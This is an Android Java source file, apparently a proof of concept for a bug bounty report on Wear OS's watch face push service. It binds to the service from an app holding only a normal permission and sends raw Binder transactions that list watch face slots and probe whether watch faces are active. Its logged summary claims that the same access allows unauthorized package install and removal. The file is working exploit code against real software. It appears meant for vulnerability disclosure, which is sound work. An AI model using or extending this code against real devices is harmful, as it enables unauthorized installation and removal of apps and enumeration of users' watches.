package com.vrp.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class WatchFacePushPocActivity extends Activity {
    private static final String TAG = "VRP_WFPUSH";
    private static final String DESCRIPTOR = "com.google.wear.services.watchfaces.watchfacepush.IWatchFacePushApi";
    private static final String LIST_CB_DESCRIPTOR = "com.google.wear.services.watchfaces.watchfacepush.IListWatchFaceSlotsCallback";
    private static final String ACTIVE_CB_DESCRIPTOR = "com.google.wear.services.watchfaces.watchfacepush.IIsWatchFaceActiveCallback";

    private IBinder mRemote;
    private TextView tv;
    private final StringBuilder sb = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(8f);
        sv.addView(tv);
        setContentView(sv);

        sb.append("=== VRP #47: WatchFace Push API Abuse ===\n");
        sb.append("PoC UID: ").append(android.os.Process.myUid()).append("\n");
        sb.append("PID: ").append(android.os.Process.myPid()).append("\n");
        sb.append("Permission: PUSH_WATCH_FACES (normal, auto-granted)\n\n");

        log("Binding to WatchFaceReceiverService...");

        Intent intent = new Intent("com.google.wear.ACTION_PUSH_WATCH_FACES");
        intent.setPackage("com.google.android.wearable.dwf.receiver");

        boolean bound = bindService(intent, new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                mRemote = service;
                log("BOUND to: " + name.flattenToString());
                log("Service binder: " + service.getClass().getName());

                new Thread(() -> {
                    testListSlots();
                    testIsActive();
                }).start();
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                log("Disconnected from service");
                mRemote = null;
            }
        }, Context.BIND_AUTO_CREATE);

        if (!bound) {
            log("FAILED to bind - permission denied or service not found");
        } else {
            log("bindService() returned true, waiting for connection...");
        }
    }

    private void testListSlots() {
        log("\n--- Transaction 5: listWatchFaceSlots ---");
        try {
            IBinder callbackBinder = new android.os.Binder() {
                @Override
                protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                    if (code == 2) {
                        data.enforceInterface(LIST_CB_DESCRIPTOR);
                        log("listSlots callback: code=2 (success/data)");
                        int dataSize = data.dataAvail();
                        log("  Callback data remaining: " + dataSize + " bytes");
                        byte[] raw = new byte[Math.min(dataSize, 512)];
                        data.readByteArray(raw);
                        StringBuilder hex = new StringBuilder();
                        for (byte b : raw) {
                            hex.append(String.format("%02x ", b));
                        }
                        log("  Raw data: " + hex.toString().trim());
                        return true;
                    }
                    if (code == 3) {
                        data.enforceInterface(LIST_CB_DESCRIPTOR);
                        log("listSlots callback: code=3 (slot info)");
                        int dataSize = data.dataAvail();
                        log("  Callback data remaining: " + dataSize + " bytes");
                        try {
                            while (data.dataAvail() > 0) {
                                String s = data.readString();
                                if (s != null) log("  Slot data: " + s);
                            }
                        } catch (Exception e) {
                            log("  Parse error: " + e.getMessage());
                        }
                        return true;
                    }
                    log("listSlots callback: unknown code=" + code + " dataAvail=" + data.dataAvail());
                    return super.onTransact(code, data, reply, flags);
                }
            };

            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeStrongBinder(callbackBinder);
                boolean result = mRemote.transact(5, data, reply, android.os.IBinder.FLAG_ONEWAY);
                log("listWatchFaceSlots transact result: " + result);
            } finally {
                data.recycle();
                reply.recycle();
            }

            Thread.sleep(3000);

        } catch (Exception e) {
            log("listSlots ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testIsActive() {
        log("\n--- Transaction 6: isWatchFaceActive ---");
        String[] testIds = {
            "com.google.android.wearable.watchface.rwf",
            "com.google.android.apps.wearable.watchface.analog",
            "test_nonexistent_id"
        };

        for (String watchFaceId : testIds) {
            try {
                final String faceId = watchFaceId;
                IBinder callbackBinder = new android.os.Binder() {
                    @Override
                    protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                        if (code == 2) {
                            data.enforceInterface(ACTIVE_CB_DESCRIPTOR);
                            int status = data.readInt();
                            log("  isActive(" + faceId + "): ERROR status=" + status);
                            return true;
                        }
                        if (code == 3) {
                            data.enforceInterface(ACTIVE_CB_DESCRIPTOR);
                            int active = data.readInt();
                            log("  isActive(" + faceId + "): " + (active == 1 ? "ACTIVE" : "NOT ACTIVE"));
                            return true;
                        }
                        log("  isActive callback: code=" + code);
                        return super.onTransact(code, data, reply, flags);
                    }
                };

                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(DESCRIPTOR);
                    data.writeString(watchFaceId);
                    data.writeStrongBinder(callbackBinder);
                    boolean result = mRemote.transact(6, data, reply, android.os.IBinder.FLAG_ONEWAY);
                    log("isWatchFaceActive(" + watchFaceId + ") transact: " + result);
                } finally {
                    data.recycle();
                    reply.recycle();
                }

                Thread.sleep(2000);

            } catch (Exception e) {
                log("isActive ERROR for " + watchFaceId + ": " + e.getMessage());
            }
        }

        log("\n--- SUMMARY ---");
        log("Service binding: SUCCESSFUL (zero-permission app)");
        log("Permission required: PUSH_WATCH_FACES (normal, auto-granted)");
        log("Available operations:");
        log("  - addWatchFace (transaction 2): push APK");
        log("  - removeWatchFace (transaction 3): delete watch face");
        log("  - updateWatchFace (transaction 4): replace watch face APK");
        log("  - listWatchFaceSlots (transaction 5): enumerate slots");
        log("  - isWatchFaceActive (transaction 6): check status");
        log("DWF receiver has INSTALL_PACKAGES + DELETE_PACKAGES");
        log("IMPACT: Unauthorized package install/removal via normal permission");
    }

    private void log(String msg) {
        Log.i(TAG, msg);
        sb.append(msg).append("\n");
        if (tv != null) {
            runOnUiThread(() -> tv.setText(sb.toString()));
        }
    }
}
